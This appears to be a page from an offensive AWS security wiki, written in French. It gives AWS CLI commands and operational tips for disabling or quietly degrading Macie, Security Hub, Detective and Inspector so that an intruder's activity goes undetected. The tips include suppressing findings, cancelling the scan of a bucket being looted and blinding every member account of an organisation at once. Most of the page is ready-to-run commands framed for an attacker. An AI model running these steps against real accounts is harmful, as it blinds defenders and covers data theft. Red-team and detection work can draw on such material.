---
title: "Services de sécurité : désactiver Macie, Security Hub, Detective et Inspector"
order: 5
description: "Désactiver et dégrader les services de posture AWS, Macie, Security Hub, Detective et Inspector, pour aveugler la détection d'exposition de données, d'agrégation de findings et de vulnérabilités avant et après des actions bruyantes."
keywords:
  - Macie
  - Security Hub
  - Detective
  - Inspector
  - detection evasion
  - posture
  - disable
---

# Services de sécurité

Au-delà de CloudTrail et GuardDuty, AWS livre une couche de services de posture et d'agrégation de findings qui révèlent ce qu'un opérateur fait : **Macie** classe et signale les données S3 sensibles, **Security Hub** agrège les findings de tous les autres services dans une console unique, **Detective** modélise le comportement en graphe pour l'investigation, et **Inspector** signale les logiciels exploitables et l'exposition réseau. Chacun se désactive ou se restreint avec un seul appel de management et, parce qu'ils alimentent la même console qu'un répondant surveille, les dégrader élargit l'angle mort que les autres pages de contournement ouvrent.

## Macie

```bash
aws macie2 get-macie-session                     # is Macie on, and the account id
aws macie2 disable-macie                         # stop sensitive-data discovery entirely
# quieter: cancel the classification job about to scan the bucket you are looting
aws macie2 update-classification-job --job-id <id> --job-status CANCELLED
```

## Security Hub

```bash
aws securityhub describe-hub
aws securityhub disable-security-hub             # tear down the aggregation console
# quieter: batch-suppress the findings you expect to raise
aws securityhub batch-update-findings \
  --finding-identifiers '[{"Id":"<id>","ProductArn":"<arn>"}]' \
  --workflow Status=SUPPRESSED
# or drop the standards that run the controls catching you
aws securityhub batch-disable-standards --standards-subscription-arns <arn>
```

## Detective

```bash
aws detective list-graphs
aws detective delete-graph --graph-arn <arn>     # remove the behavior graph
# in a member setup, cut this account out of the investigation graph
aws detective disassociate-membership --graph-arn <arn>
```

## Inspector

```bash
aws inspector2 batch-get-account-status
aws inspector2 disable --resource-types EC2 ECR LAMBDA   # stop vulnerability reporting
```

## Notes d'exploitation

- Chaque appel ici est un événement de management que CloudTrail enregistre : séquencez-les donc avec le travail sur [CloudTrail](cloudtrail.md) ou acceptez qu'ils remontent.
- Préférez les appels sélectifs (annuler le job Macie, supprimer le finding Security Hub, désactiver un seul type de scan Inspector) à une désactivation complète lorsque le service est surveillé pour son activation.
- Ceux-ci sont souvent exécutés depuis un compte de délégation ou de gestion ; dans une configuration d'organisation, désactiver centralement aveugle tous les membres d'un coup, tandis qu'un appel sur un compte membre n'aveugle que ce membre.
- Security Hub est un agrégateur : y supprimer un finding le masque de la console même si le service source (GuardDuty, Config, Inspector) le détient toujours, ce qui est plus discret que de toucher à chaque source.

## Outils

- **AWS CLI** (`macie2`, `securityhub`, `detective`, `inspector2`) : tout ce qui précède.
- **Pacu** (`detection__enum_services`) : énumérer quels services de posture sont activés avant d'y toucher.

## Références

- [HackTricks Cloud : contournement de défense AWS](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-defense-evasion/index.html)
- [AWS : Security Hub BatchUpdateFindings](https://docs.aws.amazon.com/securityhub/1.0/APIReference/API_BatchUpdateFindings.html)
- [AWS : Macie disable-macie](https://docs.aws.amazon.com/macie/latest/APIReference/macie.html)
- [Stratus Red Team : techniques de contournement de défense AWS](https://stratus-red-team.cloud/attack-techniques/AWS/)
- [Datadog Security Labs : recherche sur le contournement de défense AWS](https://securitylabs.datadoghq.com/)
